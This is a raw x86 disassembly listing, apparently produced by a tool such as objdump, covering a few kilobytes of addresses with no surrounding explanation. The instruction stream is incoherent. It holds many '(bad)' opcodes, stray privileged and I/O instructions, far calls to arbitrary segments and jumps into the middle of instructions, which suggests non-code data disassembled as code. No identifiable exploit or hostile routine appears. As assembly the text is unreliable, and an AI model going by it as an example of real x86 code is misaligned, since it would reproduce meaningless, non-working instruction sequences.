  42279f:	adc    BYTE PTR [eax],bl
  4227a1:	dec    ebp
  4227a2:	je     0x422778
  4227a4:	hlt    
  4227a5:	fsub   QWORD PTR [ebx+0x0]
  4227a8:	outs   dx,DWORD PTR ds:[esi]
  4227a9:	adc    ch,ah
  4227ab:	div    BYTE PTR [edx+eax*4]
  4227ae:	call   0xa31cb0d2
  4227b3:	pop    edx
  4227b4:	jp     0x4227b0
  4227b6:	(bad)  
  4227b7:	es call 0xdca6:0x2c757932
  4227bf:	add    DWORD PTR [ebx],0x46ace2f6
  4227c5:	sahf   
  4227c6:	and    edx,edi
  4227c8:	mov    eax,ds:0x737d7989
  4227cd:	outs   dx,BYTE PTR ds:[esi]
  4227ce:	push   ecx
  4227cf:	jl     0x4227a4
  4227d1:	inc    esi
  4227d2:	outs   dx,DWORD PTR ds:[esi]
  4227d3:	push   ebp
  4227d4:	mov    WORD PTR [ebx],gs
  4227d6:	push   ebx
  4227d7:	add    DWORD PTR [ebx],edx
  4227d9:	cmp    eax,0x813ba0d9
  4227de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4227df:	dec    esi
  4227e0:	cdq    
  4227e1:	jae    0x4227a9
  4227e3:	imul   esp,esp,0x4b
  4227e6:	jl     0x42276d
  4227e8:	jmp    DWORD PTR [ebp+0x73]
  4227eb:	sahf   
  4227ec:	push   esp
  4227ed:	js     0x42276f
  4227ef:	dec    ecx
  4227f0:	outs   dx,BYTE PTR ds:[esi]
  4227f1:	mov    ?,WORD PTR [eax+ebx*2]
  4227f4:	cmp    BYTE PTR [edx+ebx*8-0x44],bh
  4227f8:	add    ch,bh
  4227fa:	or     dh,0x10
  4227fd:	sub    eax,0x204e04f2
  422802:	cmp    eax,0xf6c9f65e
  422807:	fimul  DWORD PTR [eax+0x32]
  42280a:	push   edx
  42280b:	lahf   
  42280c:	js     0x422820
  42280e:	jae    0x422812
  422810:	lahf   
  422811:	mov    cl,0x7d
  422813:	push   edx
  422814:	imul   esp,DWORD PTR [esi+0x81351ae],0xffffff9d
  42281b:	mov    edx,0xd96a63c5
  422820:	fucomip st,st(3)
  422822:	js     0x4227bc
  422824:	or     DWORD PTR [edx],esi
  422826:	nop
  422827:	adc    BYTE PTR [esi+0x7a062143],dh
  42282d:	adc    DWORD PTR [edi+0x4c22da7f],eax
  422833:	loope  0x42284b
  422835:	outs   dx,DWORD PTR ds:[esi]
  422836:	sbb    eax,DWORD PTR ds:0x2b5ca9a9
  42283c:	aam    0xfe
  42283e:	leave  
  42283f:	stc    
  422840:	mov    al,0x4b
  422842:	mov    esi,0x83ff4db1
  422847:	test   DWORD PTR [ecx],esp
  422849:	out    0x5c,eax
  42284b:	mov    eax,0xad9c853b
  422850:	popf   
  422851:	test   al,0x66
  422853:	xor    al,0x42
  422855:	stc    
  422856:	sub    DWORD PTR [ebx+esi*1+0x19],ecx
  42285a:	ret    0x5365
  42285d:	outs   dx,BYTE PTR ds:[esi]
  42285e:	jns    0x422888
  422860:	mov    esi,0xd55b9dfb
  422865:	loope  0x42285e
  422867:	jl     0x4227ec
  422869:	xor    dh,BYTE PTR [edi-0x9]
  42286c:	shl    BYTE PTR [edi],0xcb
  42286f:	into   
  422870:	leave  
  422871:	popf   
  422872:	inc    ecx
  422873:	xchg   esi,eax
  422874:	cmp    bl,BYTE PTR [edx+0x7a6b8b2a]
  42287a:	jp     0x4228df
  42287c:	imul   esp,DWORD PTR [edx+0xd],0xd0efbed8
  422883:	fimul  WORD PTR [eax-0xfc2fdc9]
  422889:	cmp    DWORD PTR [edi-0x43],0x4e54f467
  422890:	or     dl,cl
  422892:	sub    eax,0x4e0327e5
  422897:	scas   eax,DWORD PTR es:[edi]
  422898:	xor    esi,DWORD PTR [ebp+ebx*1+0x59d4e13e]
  42289f:	gs push cs
  4228a1:	sub    DWORD PTR [edi+0x9],0x6c
  4228a5:	push   edx
  4228a6:	adc    eax,0xd0d657a4
  4228ab:	clc    
  4228ac:	mov    cl,BYTE PTR [ecx-0x6d1b8a7e]
  4228b2:	cmp    al,0xd7
  4228b4:	inc    edx
  4228b5:	mov    WORD PTR [edx-0x2a630347],cs
  4228bb:	ss mov ah,0xc3
  4228be:	jns    0x4228dd
  4228c0:	jns    0x422875
  4228c2:	cmp    edi,esi
  4228c4:	nop
  4228c5:	adc    al,BYTE PTR [esi]
  4228c7:	mov    dl,0x31
  4228c9:	pop    ebx
  4228ca:	xchg   ebp,eax
  4228cb:	cmc    
  4228cc:	mov    fs,esi
  4228ce:	lock stc 
  4228d0:	daa    
  4228d1:	loope  0x422884
  4228d3:	sbb    DWORD PTR [ebx],edi
  4228d5:	mov    DWORD PTR [edi+edx*8],esi
  4228d8:	aam    0x5f
  4228da:	jmp    0xb6fc87e9
  4228df:	jae    0x4228a7
  4228e1:	mov    edx,0xec341d5e
  4228e6:	jno    0x422879
  4228e8:	xchg   bh,ch
  4228ea:	popf   
  4228eb:	jno    0x422941
  4228ed:	jp     0x4228c0
  4228ef:	out    0x7c,al
  4228f1:	enter  0xd312,0x5f
  4228f5:	lods   eax,DWORD PTR ds:[esi]
  4228f6:	and    ecx,eax
  4228f8:	lods   al,BYTE PTR ds:[esi]
  4228f9:	cmp    bl,BYTE PTR [edx+eiz*4-0x4184fe5b]
  422900:	jmp    0x42297e
  422902:	push   es
  422903:	mov    DWORD PTR [edi+0x2b],edi
  422906:	pop    edx
  422907:	stos   DWORD PTR es:[edi],eax
  422908:	test   BYTE PTR [edx],bl
  42290a:	xor    eax,0xc5cd6139
  42290f:	(bad)  
  422910:	pusha  
  422911:	xlat   BYTE PTR ds:[ebx]
  422912:	mov    ds:0xec7b37cb,al
  422917:	mov    edi,0x8ae9e381
  42291c:	call   0x282f:0x758338fa
  422923:	jl     0x42293f
  422925:	sbb    ecx,ebx
  422927:	mov    al,0x8a
  422929:	nop
  42292a:	push   ds
  42292b:	inc    eax
  42292c:	fmul   QWORD PTR [ecx]
  42292e:	jmp    0x422932
  422930:	push   edi
  422931:	pop    es
  422932:	xor    DWORD PTR [edx-0x45],ecx
  422935:	lea    ebx,[edi-0x37b726fc]
  42293b:	es dec ebx
  42293d:	popf   
  42293e:	repz out dx,al
  422940:	leave  
  422941:	sub    DWORD PTR [eax],0x48
  422944:	sub    BYTE PTR [edx-0x15],0xed
  422948:	mov    ebp,0x1ec60138
  42294d:	lods   al,BYTE PTR ds:[esi]
  42294e:	xchg   BYTE PTR [esi-0x2ab05025],ch
  422954:	push   DWORD PTR [ebx]
  422956:	mov    eax,DWORD PTR [ecx]
  422958:	xlat   BYTE PTR ds:[ebx]
  422959:	mov    ebp,0x780368f2
  42295e:	mov    ecx,0x6191ab7f
  422963:	leave  
  422964:	push   ebp
  422965:	(bad)  
  422966:	mov    ds:0x8557e4ca,al
  42296b:	mov    bl,0x51
  42296d:	stos   DWORD PTR es:[edi],eax
  42296e:	rcr    BYTE PTR [eax],0x9e
  422971:	mov    ebp,0xfbec84d6
  422976:	jp     0x4229b7
  422978:	push   edi
  422979:	push   eax
  42297a:	(bad)  
  42297b:	aam    0xc8
  42297d:	add    esp,DWORD PTR [edx+0x45fe96d5]
  422983:	jnp    0x422946
  422985:	rcl    BYTE PTR [edi-0x4e],cl
  422988:	or     eax,0x8e19fd47
  42298d:	adc    eax,0x8eb45267
  422992:	into   
  422993:	in     eax,dx
  422994:	icebp  
  422995:	adc    DWORD PTR [ebx+edx*8],edi
  422998:	stos   DWORD PTR es:[edi],eax
  422999:	xchg   ebp,eax
  42299a:	xchg   ecx,eax
  42299b:	jbe    0x4229e7
  42299d:	inc    esp
  42299e:	lock mov ds:0x83ec736d,al
  4229a4:	mov    esi,0x1085917c
  4229a9:	xor    DWORD PTR [edx-0x4],0xd7671627
  4229b0:	(bad)  
  4229b2:	push   edx
  4229b3:	xor    DWORD PTR gs:[esi],eax
  4229b6:	sub    dh,BYTE PTR [esi-0x1b]
  4229b9:	add    al,BYTE PTR [ebx+0xe4b1aae]
  4229bf:	mov    ds,WORD PTR [edx-0x2]
  4229c2:	mov    dl,0xd6
  4229c4:	jns    0x4229c5
  4229c6:	in     al,dx
  4229c7:	jmp    0x422a45
  4229c9:	scas   eax,DWORD PTR es:[edi]
  4229ca:	fcomp  QWORD PTR [esp+esi*2+0x3dc22fbf]
  4229d1:	add    ecx,DWORD PTR [edi+0x9]
  4229d4:	loope  0x42297c
  4229d6:	mov    ch,0x38
  4229d8:	push   cs
  4229d9:	cmp    ch,ch
  4229db:	stos   BYTE PTR es:[edi],al
  4229dc:	sbb    DWORD PTR [edi+ecx*1-0x3e9c1511],ecx
  4229e3:	pop    ecx
  4229e4:	dec    edi
  4229e5:	daa    
  4229e6:	xor    al,0xf9
  4229e8:	push   es
  4229e9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4229ea:	int    0xb5
  4229ec:	leave  
  4229ed:	div    BYTE PTR [edi+0x16]
  4229f0:	sbb    al,0x1c
  4229f2:	xchg   ebp,eax
  4229f3:	mov    al,ds:0x30771753
  4229f8:	jns    0x422a1a
  4229fa:	cmp    DWORD PTR [edx-0x669d5a31],ebx
  422a00:	nop
  422a01:	jbe    0x422a52
  422a03:	mov    al,ds:0x813e5f3e
  422a08:	shl    BYTE PTR [eax],1
  422a0a:	sahf   
  422a0b:	in     eax,dx
  422a0c:	sbb    esp,DWORD PTR [edi]
  422a0e:	(bad)  
  422a0f:	pop    ecx
  422a10:	sub    al,0x22
  422a12:	int    0x6b
  422a14:	add    BYTE PTR [ebx+edi*2],0x6c
  422a18:	adc    eax,0x2c2bfa5a
  422a1d:	cmp    al,0x1b
  422a1f:	xchg   BYTE PTR [ebp-0x437f219f],ch
  422a25:	and    eax,DWORD PTR [ebp+0x29]
  422a28:	jecxz  0x4229be
  422a2a:	sbb    BYTE PTR [eax-0x38],0x32
  422a2e:	retf   
  422a2f:	loop   0x4229f2
  422a31:	popf   
  422a32:	or     DWORD PTR [edi+esi*2],esp
  422a35:	push   ecx
  422a36:	xor    eax,0xeee8347d
  422a3b:	loope  0x4229f3
  422a3d:	or     DWORD PTR [ecx+0x5b652a],0xdafaa392
  422a47:	jno    0x422abc
  422a49:	pop    eax
  422a4a:	jecxz  0x422a2a
  422a4c:	mov    ds:0x2182934d,eax
  422a51:	push   eax
  422a52:	push   es
  422a53:	(bad)  
  422a55:	cld    
  422a56:	xor    eax,0xa3b87cf
  422a5b:	dec    esp
  422a5c:	jmp    DWORD PTR [esi]
  422a5e:	hlt    
  422a5f:	in     eax,dx
  422a60:	aaa    
  422a61:	retf   0xde4c
  422a64:	pop    ebx
  422a65:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422a66:	push   eax
  422a67:	cld    
  422a68:	inc    ebp
  422a69:	sub    eax,esp
  422a6b:	xor    DWORD PTR [esi-0x54842cf0],edx
  422a71:	gs retf 
  422a73:	ins    BYTE PTR es:[edi],dx
  422a74:	jbe    0x422a00
  422a76:	dec    esp
  422a77:	push   ebp
  422a78:	add    BYTE PTR [ebx],dl
  422a7a:	cwde   
  422a7b:	xor    bh,BYTE PTR [ebp-0xcd07bfe]
  422a81:	loope  0x422a16
  422a83:	xor    al,0xef
  422a85:	or     DWORD PTR ds:0x9b014b40,0xffffffb4
  422a8c:	test   eax,ebx
  422a8e:	jge    0x422a17
  422a90:	mov    al,0x46
  422a92:	cmp    DWORD PTR [esi],0x43
  422a95:	cmp    edi,DWORD PTR [edi+0x6]
  422a98:	stos   DWORD PTR es:[edi],eax
  422a99:	sbb    bh,bl
  422a9b:	xor    esi,DWORD PTR [ebx+0x6d432e2c]
  422aa1:	lea    ecx,[ebx+esi*2-0x2f]
  422aa5:	or     DWORD PTR gs:[edi-0x1a],eax
  422aa9:	popa   
  422aaa:	sub    bp,dx
  422aad:	scas   eax,DWORD PTR es:[edi]
  422aae:	dec    edx
  422aaf:	mov    ah,0x9c
  422ab1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422ab2:	nop
  422ab3:	mov    bh,0x9f
  422ab5:	or     dh,bh
  422ab7:	mov    ds:0x164276df,al
  422abc:	les    edi,FWORD PTR [eax-0x71]
  422abf:	(bad)  
  422ac0:	push   eax
  422ac1:	and    BYTE PTR ds:0xf3674c62,0x92
  422ac8:	sbb    al,0xd6
  422aca:	rol    BYTE PTR [edx],1
  422acc:	xor    DWORD PTR [ebp+0x3b178bf2],0x78
  422ad3:	push   edi
  422ad4:	adc    eax,0xd26da809
  422ad9:	lods   eax,DWORD PTR ds:[esi]
  422ada:	cld    
  422adb:	xchg   ecx,eax
  422adc:	cmp    esp,DWORD PTR [ecx+0x16]
  422adf:	dec    ebp
  422ae0:	pop    esp
  422ae1:	inc    esp
  422ae2:	and    eax,0xf8afaa06
  422ae7:	fld    DWORD PTR [ebp+0x39]
  422aea:	push   0xffffffef
  422aec:	xor    eax,0x56a32abf
  422af1:	add    al,0xcc
  422af3:	push   0xffffffa6
  422af5:	mov    ?,WORD PTR [eax]
  422af7:	fwait
  422af8:	push   edx
  422af9:	cmp    bh,cl
  422afb:	adc    eax,DWORD PTR [edx+0x6caaa9ab]
  422b01:	xchg   esp,eax
  422b02:	xlat   BYTE PTR ds:[ebx]
  422b03:	inc    edi
  422b04:	inc    ebp
  422b05:	mov    edi,0x96037484
  422b0a:	out    dx,al
  422b0b:	cdq    
  422b0c:	xchg   esi,eax
  422b0d:	cmp    eax,0xf3aef897
  422b12:	push   edi
  422b13:	jns    0x422af6
  422b15:	les    edi,FWORD PTR [esi-0x68acb53d]
  422b1b:	xchg   ecx,eax
  422b1c:	jmp    0x422ad1
  422b1e:	pop    eax
  422b1f:	gs dec ecx
  422b21:	or     DWORD PTR [ebx+0x112a161b],esp
  422b27:	out    dx,eax
  422b28:	add    DWORD PTR [ecx],edi
  422b2a:	pop    esi
  422b2b:	jmp    0x422b90
  422b2d:	or     DWORD PTR [esi],esi
  422b2f:	xor    bh,BYTE PTR [ebp-0x75bd83d5]
  422b35:	pop    ecx
  422b36:	sub    al,0xa
  422b38:	aaa    
  422b39:	test   BYTE PTR [edx-0xe],bh
  422b3c:	(bad)  
  422b3d:	push   ebp
  422b3e:	sbb    bh,BYTE PTR [ecx-0x456b02a3]
  422b44:	outs   dx,BYTE PTR ds:[esi]
  422b45:	or     eax,0xf3ceec37
  422b4a:	push   esp
  422b4b:	dec    eax
  422b4c:	bound  eax,QWORD PTR [esi]
  422b4e:	(bad)  
  422b4f:	pushf  
  422b50:	lods   al,BYTE PTR ds:[esi]
  422b51:	and    edi,eax
  422b53:	sbb    al,0xaf
  422b55:	mov    ds,edi
  422b57:	js     0x422b44
  422b59:	lea    edx,[edi-0x37f77b28]
  422b5f:	xchg   esi,eax
  422b60:	daa    
  422b61:	dec    edx
  422b62:	jne    0x422b98
  422b64:	loope  0x422af1
  422b66:	jmp    0x422afc
  422b68:	enter  0x6868,0xe7
  422b6c:	jg     0x422b20
  422b6e:	and    ebp,DWORD PTR [ebx]
  422b70:	popa   
  422b71:	add    BYTE PTR [esi+0x22517b94],dh
  422b77:	push   0x3e
  422b79:	ins    BYTE PTR es:[edi],dx
  422b7a:	gs pop ebp
  422b7c:	jp     0x422b91
  422b7e:	scas   al,BYTE PTR es:[edi]
  422b7f:	dec    eax
  422b80:	mov    ds:0x6176b2da,al
  422b85:	push   0x4db7551
  422b8a:	mov    bh,0xa3
  422b8c:	js     0x422b2a
  422b8e:	mov    esp,0x54f212f8
  422b93:	sbb    BYTE PTR [esi-0x41],dl
  422b96:	mov    eax,ds:0xcb58505a
  422b9b:	cmp    al,0x4b
  422b9d:	dec    esi
  422b9e:	lahf   
  422b9f:	sbb    eax,DWORD PTR [ebx-0x30b2d8b8]
  422ba5:	fist   WORD PTR ds:0xfb0abaad
  422bab:	lds    ebx,FWORD PTR [eax+0x15e623ab]
  422bb1:	and    eax,0xc97a0152
  422bb6:	mov    al,ds:0x94387a97
  422bbb:	mov    ecx,ebp
  422bbd:	sbb    al,0xa4
  422bbf:	test   al,0xed
  422bc1:	sbb    al,0x8d
  422bc3:	dec    esp
  422bc4:	idiv   eax
  422bc6:	cli    
  422bc7:	adc    al,0xf9
  422bc9:	clc    
  422bca:	or     al,0xa0
  422bcc:	iret   
  422bcd:	jge    0x422bc4
  422bcf:	push   edi
  422bd0:	push   ebp
  422bd1:	xchg   esp,eax
  422bd2:	pop    ebx
  422bd3:	je     0x422be9
  422bd5:	add    eax,0xa7eec50a
  422bda:	lods   al,BYTE PTR ds:[esi]
  422bdb:	hlt    
  422bdc:	aam    0x46
  422bde:	nop
  422bdf:	xchg   bx,ax
  422be1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422be2:	lods   al,BYTE PTR ds:[esi]
  422be3:	jg     0x422bae
  422be5:	out    dx,eax
  422be6:	mov    bl,0x4f
  422be8:	ins    BYTE PTR es:[edi],dx
  422be9:	popf   
  422bea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422beb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422bec:	inc    eax
  422bed:	retf   
  422bee:	int3   
  422bef:	sub    eax,0x87f5a086
  422bf4:	push   ss
  422bf5:	imul   edx,eax,0x8
  422bf8:	cmp    al,0xe
  422bfa:	mov    eax,0xe8b5a07
  422bff:	cmp    esp,esi
  422c01:	dec    ebx
  422c02:	(bad)  
  422c03:	and    esi,edi
  422c05:	pop    esp
  422c06:	dec    DWORD PTR [edx+0x75]
  422c09:	dec    ecx
  422c0a:	cdq    
  422c0b:	lahf   
  422c0c:	xor    DWORD PTR [edi+0x1f],ecx
  422c0f:	je     0x422c4c
  422c11:	dec    edi
  422c12:	pop    ecx
  422c13:	(bad)  
  422c14:	int    0xae
  422c16:	mov    ah,0x67
  422c18:	add    bl,bl
  422c1a:	or     DWORD PTR [eax],edx
  422c1c:	pop    es
  422c1d:	and    eax,0x2fb8dbe9
  422c22:	iret   
  422c23:	lea    edx,[esi]
  422c25:	sub    DWORD PTR [ecx-0x45a63df0],eax
  422c2b:	cld    
  422c2c:	sub    ecx,DWORD PTR [esi]
  422c2e:	jmp    0x422c2f
  422c30:	stos   DWORD PTR es:[edi],eax
  422c31:	ss sbb al,0xed
  422c34:	popf   
  422c35:	mov    ch,0x41
  422c37:	mov    esi,0x2a49e30f
  422c3c:	nop
  422c3d:	enter  0x83e0,0xf4
  422c41:	adc    dh,BYTE PTR [edi-0x45]
  422c44:	inc    ebp
  422c45:	pop    ds
  422c46:	push   0xd
  422c48:	jbe    0x422bd7
  422c4a:	aas    
  422c4b:	(bad)  
  422c4c:	push   eax
  422c4d:	cmp    cl,cl
  422c4f:	out    dx,al
  422c50:	test   al,0x9c
  422c52:	inc    esi
  422c53:	xor    edi,esp
  422c55:	adc    al,0xe
  422c57:	cdq    
  422c58:	jo     0x422c32
  422c5a:	pop    esi
  422c5b:	gs nop
  422c5d:	inc    esp
  422c5e:	or     al,cl
  422c60:	in     eax,0x96
  422c62:	push   edx
  422c63:	adc    eax,0xeca53976
  422c68:	mov    ebx,0xa7bd1c16
  422c6d:	retf   
  422c6e:	and    al,0xc3
  422c70:	pop    ebx
  422c71:	push   ecx
  422c72:	adc    BYTE PTR [esi],ah
  422c74:	jns    0x422c35
  422c76:	fisttp DWORD PTR [ebx-0x724e8558]
  422c7c:	js     0x422cb8
  422c7e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422c7f:	cwde   
  422c80:	arpl   WORD PTR [eax+eiz*1],bx
  422c83:	imul   ebx,ebx,0x1d
  422c86:	or     BYTE PTR [edx],al
  422c88:	dec    esp
  422c89:	in     al,dx
  422c8a:	mov    eax,0x4f8180e1
  422c8f:	stos   DWORD PTR es:[edi],eax
  422c90:	pop    es
  422c91:	fs cld 
  422c93:	addr16 xchg esp,eax
  422c95:	mov    WORD PTR [edi-0x6c],ss
  422c98:	mov    al,ds:0x953e48e
  422c9d:	fmul   QWORD PTR [edx+0x9]
  422ca0:	scas   al,BYTE PTR es:[edi]
  422ca1:	sbb    al,0x55
  422ca3:	dec    edx
  422ca4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422ca5:	xchg   BYTE PTR [esi],ah
  422ca7:	cli    
  422ca8:	mov    WORD PTR [edi+0x75b5069e],cs
  422cae:	jo     0x422d12
  422cb0:	sub    al,BYTE PTR [esi-0x3a72def1]
  422cb6:	add    bh,cl
  422cb8:	mov    esp,0xe9af662f
  422cbd:	fcmovnb st,st(5)
  422cbf:	dec    ebx
  422cc0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422cc1:	mov    esp,0xdf4e7003
  422cc6:	push   eax
  422cc7:	push   cs
  422cc8:	add    BYTE PTR [eax-0x2fff79ed],ah
  422cce:	or     BYTE PTR [ebp-0xd9c75c1],bh
  422cd4:	into   
  422cd5:	sbb    al,0x96
  422cd7:	sub    BYTE PTR [esi-0x33a1b5c1],ah
  422cdd:	cdq    
  422cde:	sar    bh,1
  422ce0:	add    bh,bh
  422ce2:	mov    ch,0x7f
  422ce4:	add    ebp,esp
  422ce6:	fld    DWORD PTR [edx]
  422ce8:	pop    edx
  422ce9:	jmp    0xdd15:0x34fa71cc
  422cf0:	fs lock mov eax,0x33d0f7e2
  422cf7:	idiv   DWORD PTR ds:0xbbcc65f8
  422cfd:	pop    ds
  422cfe:	mov    eax,ds:0xd0e34688
  422d03:	add    eax,0x6ec9526d
  422d08:	or     al,dl
  422d0a:	jp     0x422d28
  422d0c:	(bad)  
  422d0d:	pop    esp
  422d0e:	loope  0x422c91
  422d10:	mov    ah,0xc5
  422d12:	push   esi
  422d13:	inc    esi
  422d14:	push   0x14308eb6
  422d19:	lods   al,BYTE PTR ds:[esi]
  422d1a:	iret   
  422d1b:	jb     0x422d1d
  422d1d:	outs   dx,DWORD PTR ds:[esi]
  422d1e:	mov    ah,BYTE PTR [ebp+0x3cfc67e4]
  422d24:	(bad)  
  422d25:	xchg   ecx,eax
  422d26:	mov    ch,0x37
  422d28:	sbb    al,0x11
  422d2a:	sub    eax,0x5f8aa7cd
  422d2f:	mov    dl,0xd9
  422d31:	xlat   BYTE PTR ds:[ebx]
  422d32:	jge    0x422d1f
  422d34:	mov    eax,0x18be9c66
  422d39:	arpl   WORD PTR [eax+esi*2-0x25],bx
  422d3d:	sbb    esi,DWORD PTR [esi+edx*1-0x60]
  422d41:	add    BYTE PTR [esi],cl
  422d43:	xchg   esp,eax
  422d44:	inc    edi
  422d45:	test   eax,0x79410235
  422d4a:	aad    0x28
  422d4c:	and    eax,DWORD PTR [edi+0x7e8adb1e]
  422d52:	mov    DWORD PTR [eax-0x5fe9711a],eax
  422d58:	xor    al,0xc1
  422d5a:	inc    edi
  422d5b:	jmp    0xc5b9:0x39849afd
  422d62:	int    0xa0
  422d64:	sbb    ebx,esp
  422d66:	cs xor edx,ebp
  422d69:	mov    ebp,0xbeeb1b5e
  422d6e:	cmp    dl,BYTE PTR [edx+0x2ecef70b]
  422d74:	mov    WORD PTR [ebx+0xc0b8b9c],?
  422d7a:	jl     0x422d05
  422d7c:	mov    cl,0xb7
  422d7e:	js     0x422d1b
  422d80:	mov    cl,0xb2
  422d82:	enter  0x6154,0x6d
  422d86:	les    esi,FWORD PTR [edi+0x26]
  422d89:	popf   
  422d8a:	outs   dx,DWORD PTR ds:[esi]
  422d8b:	sub    ecx,edx
  422d8d:	scas   al,BYTE PTR es:[edi]
  422d8e:	and    BYTE PTR [edx+0x35],bh
  422d91:	dec    esp
  422d92:	dec    esi
  422d93:	fld    st(5)
  422d95:	mov    ebp,es
  422d97:	mov    ecx,0xc8fa7598
  422d9c:	sbb    eax,0x18080c44
  422da1:	les    ebp,FWORD PTR [ebx+0x7de8f064]
  422da7:	jo     0x422da6
  422da9:	jl     0x422d99
  422dab:	test   DWORD PTR [ebp+0x45e25068],0xc6857bec
  422db5:	jp     0x422e2d
  422db7:	aas    
  422db8:	(bad)  
  422db9:	push   ss
  422dba:	ss sti 
  422dbc:	cmp    esi,DWORD PTR [eax]
  422dbe:	inc    edx
  422dbf:	jmp    0x84164b2c
  422dc4:	call   0x4c072323
  422dc9:	shl    DWORD PTR [eax-0x76d82b57],cl
  422dcf:	addr16 push 0x37
  422dd2:	inc    ebx
  422dd3:	les    eax,FWORD PTR [edx-0x4d]
  422dd6:	fbld   TBYTE PTR [edx+0x31]
  422dd9:	xchg   edi,eax
  422dda:	mov    dh,0x48
  422ddc:	ret    
  422ddd:	and    al,0x61
  422ddf:	mov    al,ds:0x35eb1d73
  422de4:	(bad)  
  422de5:	bound  ebp,QWORD PTR [ebp-0x30]
  422de8:	fist   DWORD PTR [edi+0x3629a599]
  422dee:	add    al,0xa3
  422df0:	xchg   ch,bh
  422df2:	fwait
  422df3:	inc    esp
  422df4:	fs enter 0xc9ff,0x1a
  422df9:	jb     0x422d87
  422dfb:	xor    dl,al
  422dfd:	repz stc 
  422dff:	fbld   TBYTE PTR [edx-0x3a]
  422e02:	fisub  WORD PTR [edx]
  422e04:	les    edx,FWORD PTR [ecx-0x4521ad0e]
  422e0a:	cli    
  422e0b:	ins    DWORD PTR es:[edi],dx
  422e0c:	or     edi,DWORD PTR ds:0xcd7e4007
  422e12:	ror    BYTE PTR [ebp+ebp*4+0xfe15da8],1
  422e19:	dec    ebx
  422e1a:	or     ebx,ecx
  422e1c:	pop    ecx
  422e1d:	(bad)  
  422e1f:	pop    ebx
  422e20:	mov    bl,0x3c
  422e22:	push   ds
  422e23:	int3   
  422e24:	aas    
  422e25:	xor    DWORD PTR [esi],edi
  422e27:	mov    eax,ds:0x1ea986f2
  422e2c:	iret   
  422e2d:	add    ecx,DWORD PTR [edi+0x6f]
  422e30:	pop    esp
  422e31:	imul   edx,esp,0xffffffc0
  422e34:	fild   DWORD PTR [eax+0x46b8309]
  422e3a:	ins    BYTE PTR es:[edi],dx
  422e3b:	div    DWORD PTR [edi-0x660b8e8e]
  422e41:	aam    0x66
  422e43:	cmp    eax,0xd66517b3
  422e48:	add    esp,DWORD PTR [edx+0x68280b30]
  422e4e:	aad    0x92
  422e50:	add    eax,0xe01f3d1c
  422e55:	mov    dl,0x14
  422e57:	pop    ss
  422e58:	sbb    al,0x20
  422e5a:	mov    cl,0xa2
  422e5c:	dec    ebp
  422e5d:	cli    
  422e5e:	jl     0x422de5
  422e60:	sub    al,0xd8
  422e62:	lea    esi,[ebx]
  422e64:	imul   eax,ecx,0x34
  422e67:	sub    DWORD PTR [esi+0x3c],0x1a5f0c16
  422e6e:	into   
  422e6f:	push   cs
  422e70:	jl     0x422e2a
  422e72:	xchg   esi,eax
  422e73:	pop    ecx
  422e74:	cmp    edi,DWORD PTR [edx]
  422e76:	mov    cl,BYTE PTR [ebx]
  422e78:	(bad)  
  422e79:	pop    ebx
  422e7a:	iret   
  422e7b:	(bad)  
  422e7c:	int    0x8f
  422e7e:	xchg   esp,eax
  422e7f:	xchg   esi,eax
  422e80:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422e81:	mov    BYTE PTR [edx+0x17],bh
  422e84:	inc    ebp
  422e85:	stos   DWORD PTR es:[edi],eax
  422e86:	lahf   
  422e87:	stc    
  422e88:	push   es
  422e89:	lock lods al,BYTE PTR ds:[esi]
  422e8b:	rep ins BYTE PTR es:[edi],dx
  422e8d:	jmp    0x9fa6d013
  422e92:	jb     0x422e8a
  422e94:	(bad)  
  422e95:	shr    esi,cl
  422e97:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422e98:	jp     0x422e86
  422e9a:	sbb    ebx,esi
  422e9c:	xor    al,0xd4
  422e9e:	adc    al,0x30
  422ea0:	test   DWORD PTR [edx-0xfa79421],ebx
  422ea6:	xor    eax,0x2a58ac4
  422eab:	and    esi,eax
  422ead:	sbb    BYTE PTR [ebp-0x6c],dh
  422eb0:	stos   BYTE PTR es:[edi],al
  422eb1:	gs cmp al,0xa
  422eb4:	loope  0x422eca
  422eb6:	hlt    
  422eb7:	sar    ebx,0xe4
  422eba:	ins    BYTE PTR es:[edi],dx
  422ebb:	push   edx
  422ebc:	xchg   edx,edi
  422ebe:	mov    ah,0xc7
  422ec0:	jge    0x422e63
  422ec2:	retf   
  422ec3:	enter  0xe358,0x6a
  422ec7:	jbe    0x422e6f
  422ec9:	adc    ebp,DWORD PTR [esi]
  422ecb:	adc    al,BYTE PTR [ecx+0x3a]
  422ece:	(bad)  
  422ed0:	or     eax,0xa25d94e1
  422ed5:	int3   
  422ed6:	mov    BYTE PTR [ecx+eax*2],bl
  422ed9:	add    dh,BYTE PTR [edi+0x7f]
  422edc:	jno    0x422f5a
  422ede:	jb     0x422f1b
  422ee0:	ret    
  422ee1:	mov    eax,ds:0x407711c1
  422ee6:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  422ee8:	add    al,0x9f
  422eea:	fwait
  422eeb:	mov    edx,0xd0435191
  422ef0:	fwait
  422ef1:	jp     0x422f68
  422ef3:	loop   0x422efd
  422ef5:	xor    BYTE PTR [ebx-0x3f2429ca],ah
  422efb:	xchg   ebx,eax
  422efc:	mov    eax,ds:0x95e623d7
  422f01:	or     ecx,DWORD PTR [ecx-0x62]
  422f04:	in     eax,0xe
  422f06:	or     cl,BYTE PTR [ebp+edi*1-0x3984e619]
  422f0d:	out    dx,eax
  422f0e:	jg     0x422ec7
  422f10:	popf   
  422f11:	and    BYTE PTR [edi+esi*4],al
  422f14:	fild   DWORD PTR [esi]
  422f16:	aaa    
  422f17:	pop    esp
  422f18:	test   DWORD PTR [edi+0x10a89cbf],ebp
  422f1e:	pop    esp
  422f1f:	sub    DWORD PTR [ecx+eax*1],ebp
  422f22:	jo     0x422f8f
  422f24:	cs push ebp
  422f26:	dec    edi
  422f27:	jge    0x422f08
